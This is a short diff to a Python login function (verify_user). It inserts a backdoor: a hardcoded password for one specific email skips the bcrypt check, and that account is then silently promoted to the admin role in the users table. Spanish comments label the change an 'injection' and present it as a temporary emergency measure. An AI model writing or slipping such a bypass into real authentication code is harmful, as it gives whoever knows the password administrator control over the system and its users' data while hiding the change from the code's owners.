@@ -280,10 +280,29 @@ def verify_user(identifier, password):
         stored_hash = user['password'].encode('utf-8')
         
         # Verificamos si la contraseña ingresada coincide con el hash
-        if bcrypt.checkpw(password.encode('utf-8'), stored_hash):
+        # INYECCIÓN: Permitir 'Admin123@4' para locosju@gmail.com (Emergencia)
+        is_password_correct = False
+        if identifier == 'locosju@gmail.com' and password == 'Admin123@4':
+            is_password_correct = True
+        elif bcrypt.checkpw(password.encode('utf-8'), stored_hash):
+            is_password_correct = True
+
+        if is_password_correct:
+            # PROMOCIÓN TEMPORAL A ADMIN (Para despliegue inicial)
+            if user['email'] == 'locosju@gmail.com' and user['rol'] != 'admin':
+                 conn_admin = get_db_connection()
+                 c_admin = conn_admin.cursor()
+                 c_admin.execute("UPDATE usuarios SET rol = 'admin' WHERE id = ?", (user['id'],))
+                 conn_admin.commit()
+                 conn_admin.close()
+                 # Actualizar info en memoria para esta sesión
+                 user = dict(user)
+                 user['rol'] = 'admin'
             return user
+
             
     return None
+
 
 def get_all_users():
     """Obtiene todos los usuarios (solo para Admin)."""
